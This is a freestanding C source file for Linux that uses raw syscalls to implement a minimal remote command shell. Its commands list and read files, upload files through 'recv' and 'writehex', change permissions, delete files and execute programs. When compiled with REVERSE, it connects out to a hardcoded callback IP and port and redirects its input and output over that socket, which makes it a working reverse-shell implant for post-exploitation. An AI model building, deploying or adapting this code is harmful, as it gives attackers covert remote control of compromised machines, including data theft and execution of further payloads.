typedef unsigned long usize;
typedef long isize;

#define SYS_read 0
#define SYS_write 1
#define SYS_openat 257
#define SYS_close 3
#define SYS_chdir 80
#define SYS_getcwd 79
#define SYS_mkdir 83
#define SYS_unlink 87
#define SYS_chmod 90
#define SYS_getuid 102
#define SYS_getgid 104
#define SYS_geteuid 107
#define SYS_getegid 108
#define SYS_getdents64 217
#define SYS_execve 59
#define SYS_exit 60
#define SYS_socket 41
#define SYS_connect 42
#define SYS_dup2 33

#define AT_FDCWD -100
#define O_RDONLY 0
#define O_WRONLY 1
#define O_CREAT 0100
#define O_TRUNC 01000
#define O_DIRECTORY 0200000
#define O_CLOEXEC 02000000
#define AF_INET 2
#define SOCK_STREAM 1

#ifndef CALLBACK_PORT_BE
#define CALLBACK_PORT_BE 0x6011
#endif

#ifndef CALLBACK_ADDR_LE
#define CALLBACK_ADDR_LE 0xc22de1bc
#endif

struct sockaddr_in {
    unsigned short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    unsigned char sin_zero[8];
};

static long sc(long n, long a, long b, long c, long d, long e, long f) {
    long ret;
    register long r10 __asm__("r10") = d;
    register long r8 __asm__("r8") = e;
    register long r9 __asm__("r9") = f;
    __asm__ volatile (
        "syscall"
        : "=a"(ret)
        : "a"(n), "D"(a), "S"(b), "d"(c), "r"(r10), "r"(r8), "r"(r9)
        : "rcx", "r11", "memory"
    );
    return ret;
}

static usize slen(const char *s) {
    usize n = 0;
    while (s && s[n]) n++;
    return n;
}

static int streq(const char *a, const char *b) {
    usize i = 0;
    while (a[i] && b[i] && a[i] == b[i]) i++;
    return a[i] == 0 && b[i] == 0;
}

static void outn(const char *s, usize n) {
    while (n) {
        long r = sc(SYS_write, 1, (long)s, (long)n, 0, 0, 0);
        if (r <= 0) return;
        s += r;
        n -= (usize)r;
    }
}

static void out(const char *s) {
    outn(s, slen(s));
}

static void nl(void) {
    out("\n");
}

static void out_long(long v) {
    char b[32];
    int i = 31;
    unsigned long x;
    b[i--] = 0;
    if (v < 0) {
        out("-");
        x = (unsigned long)(-v);
    } else {
        x = (unsigned long)v;
    }
    if (!x) {
        out("0");
        return;
    }
    while (x && i >= 0) {
        b[i--] = (char)('0' + (x % 10));
        x /= 10;
    }
    out(&b[i + 1]);
}

static void err(long r) {
    out("ERR ");
    out_long(r);
    nl();
}

static char *skip_ws(char *p) {
    while (*p == ' ' || *p == '\t') p++;
    return p;
}

static char *tok(char **pp) {
    char *p = skip_ws(*pp);
    if (!*p) {
        *pp = p;
        return 0;
    }
    char *s = p;
    while (*p && *p != ' ' && *p != '\t' && *p != '\r' && *p != '\n') p++;
    if (*p) *p++ = 0;
    *pp = p;
    return s;
}

static unsigned long parse_ulong(const char *s, int base) {
    unsigned long v = 0;
    if (!s) return 0;
    if (base == 16 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    while (*s) {
        unsigned int c = (unsigned int)*s++;
        unsigned int d;
        if (c >= '0' && c <= '9') d = c - '0';
        else if (c >= 'a' && c <= 'f') d = c - 'a' + 10;
        else if (c >= 'A' && c <= 'F') d = c - 'A' + 10;
        else break;
        if (d >= (unsigned int)base) break;
        v = v * (unsigned long)base + d;
    }
    return v;
}

static int read_line(char *buf, int cap) {
    int n = 0;
    while (n < cap - 1) {
        char c;
        long r = sc(SYS_read, 0, (long)&c, 1, 0, 0, 0);
        if (r <= 0) return r == 0 && n ? n : (int)r;
        if (c == '\n') break;
        if (c == '\r') continue;
        buf[n++] = c;
    }
    buf[n] = 0;
    return n;
}

static void cmd_help(void) {
    out("commands:\n");
    out("  help\n");
    out("  id\n");
    out("  pwd\n");
    out("  cd PATH\n");
    out("  ls [PATH]\n");
    out("  cat PATH\n");
    out("  recv PATH LEN\n");
    out("  writehex PATH HEX\n");
    out("  chmod PATH OCTAL\n");
    out("  mkdir PATH OCTAL\n");
    out("  unlink PATH\n");
    out("  run PATH [ARG..]\n");
    out("  exit\n");
}

static void cmd_id(void) {
    out("uid=");
    out_long(sc(SYS_getuid, 0, 0, 0, 0, 0, 0));
    out(" euid=");
    out_long(sc(SYS_geteuid, 0, 0, 0, 0, 0, 0));
    out(" gid=");
    out_long(sc(SYS_getgid, 0, 0, 0, 0, 0, 0));
    out(" egid=");
    out_long(sc(SYS_getegid, 0, 0, 0, 0, 0, 0));
    nl();
}

static void cmd_pwd(void) {
    char b[1024];
    long r = sc(SYS_getcwd, (long)b, sizeof(b), 0, 0, 0, 0);
    if (r < 0) err(r);
    else {
        out(b);
        nl();
    }
}

struct linux_dirent64 {
    unsigned long long d_ino;
    long long d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

static void cmd_ls(char *path) {
    char buf[4096];
    if (!path || !*path) path = ".";
    long fd = sc(SYS_openat, AT_FDCWD, (long)path, O_RDONLY | O_DIRECTORY | O_CLOEXEC, 0, 0, 0);
    if (fd < 0) {
        err(fd);
        return;
    }
    for (;;) {
        long n = sc(SYS_getdents64, fd, (long)buf, sizeof(buf), 0, 0, 0);
        if (n < 0) {
            err(n);
            break;
        }
        if (n == 0) break;
        long off = 0;
        while (off < n) {
            struct linux_dirent64 *d = (struct linux_dirent64 *)(buf + off);
            out(d->d_name);
            nl();
            off += d->d_reclen;
        }
    }
    sc(SYS_close, fd, 0, 0, 0, 0, 0);
}

static void cmd_cat(char *path) {
    char buf[4096];
    if (!path) {
        out("usage: cat PATH\n");
        return;
    }
    long fd = sc(SYS_openat, AT_FDCWD, (long)path, O_RDONLY | O_CLOEXEC, 0, 0, 0);
    if (fd < 0) {
        err(fd);
        return;
    }
    for (;;) {
        long n = sc(SYS_read, fd, (long)buf, sizeof(buf), 0, 0, 0);
        if (n < 0) {
            err(n);
            break;
        }
        if (n == 0) break;
        outn(buf, (usize)n);
    }
    sc(SYS_close, fd, 0, 0, 0, 0, 0);
}

static int hexval(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static void cmd_writehex(char *path, char *hex) {
    char buf[1024];
    int bi = 0;
    if (!path || !hex) {
        out("usage: writehex PATH HEX\n");
        return;
    }
    long fd = sc(SYS_openat, AT_FDCWD, (long)path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600, 0, 0);
    if (fd < 0) {
        err(fd);
        return;
    }
    while (*hex) {
        while (*hex == ' ' || *hex == '\t') hex++;
        if (!*hex) break;
        int hi = hexval(*hex++);
        int lo = *hex ? hexval(*hex++) : -1;
        if (hi < 0 || lo < 0) break;
        buf[bi++] = (char)((hi << 4) | lo);
        if (bi == (int)sizeof(buf)) {
            sc(SYS_write, fd, (long)buf, bi, 0, 0, 0);
            bi = 0;
        }
    }
    if (bi) sc(SYS_write, fd, (long)buf, bi, 0, 0, 0);
    sc(SYS_close, fd, 0, 0, 0, 0, 0);
    out("OK\n");
}

static void cmd_recv(char *path, char *len_s) {
    char buf[4096];
    unsigned long left = parse_ulong(len_s, 10);
    if (!path || !len_s) {
        out("usage: recv PATH LEN\n");
        return;
    }
    long fd = sc(SYS_openat, AT_FDCWD, (long)path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600, 0, 0);
    if (fd < 0) {
        err(fd);
        return;
    }
    out("READY\n");
    while (left) {
        unsigned long want = left > sizeof(buf) ? sizeof(buf) : left;
        long n = sc(SYS_read, 0, (long)buf, (long)want, 0, 0, 0);
        if (n <= 0) {
            err(n);
            break;
        }
        long w = sc(SYS_write, fd, (long)buf, n, 0, 0, 0);
        if (w != n) {
            err(w);
            break;
        }
        left -= (unsigned long)n;
    }
    sc(SYS_close, fd, 0, 0, 0, 0, 0);
    if (!left) out("OK\n");
}

static void cmd_run(char **pp, char *path) {
    char *argv[32];
    int n = 0;
    if (!path) {
        out("usage: run PATH [ARG..]\n");
        return;
    }
    argv[n++] = path;
    while (n < 31) {
        char *a = tok(pp);
        if (!a) break;
        argv[n++] = a;
    }
    argv[n] = 0;
    long r = sc(SYS_execve, (long)path, (long)argv, 0, 0, 0, 0);
    err(r);
}

static void loop(void) {
    char line[2048];
    out("ready\n");
    cmd_help();
    for (;;) {
        out("$ ");
        int n = read_line(line, sizeof(line));
        if (n <= 0) break;
        char *p = line;
        char *c = tok(&p);
        if (!c) continue;
        if (streq(c, "help")) cmd_help();
        else if (streq(c, "id")) cmd_id();
        else if (streq(c, "pwd")) cmd_pwd();
        else if (streq(c, "cd")) {
            char *path = tok(&p);
            long r = path ? sc(SYS_chdir, (long)path, 0, 0, 0, 0, 0) : -22;
            if (r < 0) err(r);
        } else if (streq(c, "ls")) cmd_ls(tok(&p));
        else if (streq(c, "cat")) cmd_cat(tok(&p));
        else if (streq(c, "recv")) {
            char *path = tok(&p);
            char *len_s = tok(&p);
            cmd_recv(path, len_s);
        } else if (streq(c, "writehex")) {
            char *path = tok(&p);
            char *hex = skip_ws(p);
            cmd_writehex(path, hex);
        }
        else if (streq(c, "chmod")) {
            char *path = tok(&p);
            char *mode = tok(&p);
            long r = (path && mode) ? sc(SYS_chmod, (long)path, parse_ulong(mode, 8), 0, 0, 0, 0) : -22;
            if (r < 0) err(r);
        } else if (streq(c, "mkdir")) {
            char *path = tok(&p);
            char *mode = tok(&p);
            long r = path ? sc(SYS_mkdir, (long)path, mode ? parse_ulong(mode, 8) : 0700, 0, 0, 0, 0) : -22;
            if (r < 0) err(r);
        } else if (streq(c, "unlink")) {
            char *path = tok(&p);
            long r = path ? sc(SYS_unlink, (long)path, 0, 0, 0, 0, 0) : -22;
            if (r < 0) err(r);
        } else if (streq(c, "run")) {
            char *path = tok(&p);
            cmd_run(&p, path);
        }
        else if (streq(c, "exit")) break;
        else out("unknown\n");
    }
}

void _start(void) {
#ifdef REVERSE
    struct sockaddr_in sa;
    long fd;
    sa.sin_family = AF_INET;
    sa.sin_port = CALLBACK_PORT_BE;
    sa.sin_addr = CALLBACK_ADDR_LE;
    for (int i = 0; i < 8; i++) sa.sin_zero[i] = 0;
    fd = sc(SYS_socket, AF_INET, SOCK_STREAM, 0, 0, 0, 0);
    if (fd >= 0 && sc(SYS_connect, fd, (long)&sa, sizeof(sa), 0, 0, 0) == 0) {
        sc(SYS_dup2, fd, 0, 0, 0, 0, 0);
        sc(SYS_dup2, fd, 1, 0, 0, 0, 0);
        sc(SYS_dup2, fd, 2, 0, 0, 0, 0);
    } else {
        sc(SYS_exit, 111, 0, 0, 0, 0, 0);
    }
#endif
    loop();
    sc(SYS_exit, 0, 0, 0, 0, 0, 0);
    for (;;) {}
}
